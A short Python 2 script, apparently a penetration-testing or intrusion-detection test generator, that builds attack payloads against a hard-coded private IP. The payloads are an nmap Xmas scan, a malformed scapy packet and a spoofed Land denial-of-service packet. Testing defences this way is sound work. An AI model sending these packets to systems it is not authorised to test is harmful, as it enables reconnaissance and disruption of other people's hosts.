#!/usr/bin/env python

class BadTraffic():
    def __init__(self, target):
        self.payloads = []
        self._target = target
        self._sudo  = "/usr/bin/sudo"
        self._nmap = "/usr/bin/nmap"
        self._niktobin = "/pentest/scanners/nikto-2.1.4/nikto.pl"
        self._niktocnf = "/pentest/scanners/nikto-2.1.4/nikto.conf"

    def getPayloads(self):

        ### Nmap Xmas Scan
        self.payloads.append([
            "Nmap Xmas scan",
            "command",
            [self._sudo, self._nmap, '-sX', '-p 80', self._target]
            ])

        ### Malformed Traffic
        self.payloads.append([
            "Malformed Traffic",
            "scapy",
            """send(IP(dst="%s", ihl=2, version=3)/ICMP())""" % self._target
            ])

        ### Land Attack
        self.payloads.append([
            "Land Attack",
            "scapy",
            """send(IP(src="%s",dst="%s")/TCP(sport=135,dport=135))""" % (self._target, self._target)
            ])

        return self.payloads

if __name__ == "__main__":
    print BadTraffic("192.168.100.48").getPayloads()